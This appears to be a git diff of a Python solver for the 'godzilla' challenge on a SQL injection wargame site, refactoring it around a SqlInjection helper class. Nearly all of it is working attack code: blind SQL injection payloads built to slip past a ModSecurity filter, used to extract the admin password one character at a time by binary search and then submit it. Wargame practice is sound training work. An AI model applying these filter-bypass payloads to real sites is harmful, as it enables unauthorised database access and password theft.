@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def check_func(*args) -> bool:
@@ -28,31 +29,24 @@ def main():
     '''
 
     url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'id'
+    other_param = {'pw': 'a'}
 
-    param = dict(id="-1'<@=1||id='admin'&&length(pw)>%s||'", pw='a')
-    len_of_key = los.find_key_len(url, param, check_func, cook)
+    payload = "-1'<@=1||id='admin'&&length(pw)>%s||'"
+    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
+    len_of_key = p.find_key_len(check_func)
 
-    print(len_of_key)
+    p.payload = f"-1'<@=1||id='admin'&&ord(mid(pw,%d,1))<%s||'"
+    result = p.find_binary(check_func, len_of_key)
 
-    result = ''
-    num_of_requests = 0
-    for i in range(1, len_of_key + 1):
-        payload = f"-1'<@=1||id='admin'&&ord(mid(pw,{i},1))<%s||'"
-        param = dict(id=payload, pw='a')
-        left, num_requests = los.find_binary(url, param, check_func,
-                                             32, 127, cook)
-        print(chr(left))
-        result += chr(left)
-        num_of_requests += num_requests
-
-    print('num_of_requests:', num_of_requests)
-
-    param = dict(pw=result)
-    response = los.get_request(url, param, cook)
-
+    p.payload = result
+    p.inj_param = 'pw'
+    p.other_param = ''
+    response = p.my_request()
     if 'Clear!' in response:
-        print('Godzilla Clear!')
+        print('\nGodzilla Clear!')
 
 
 if __name__ == '__main__':
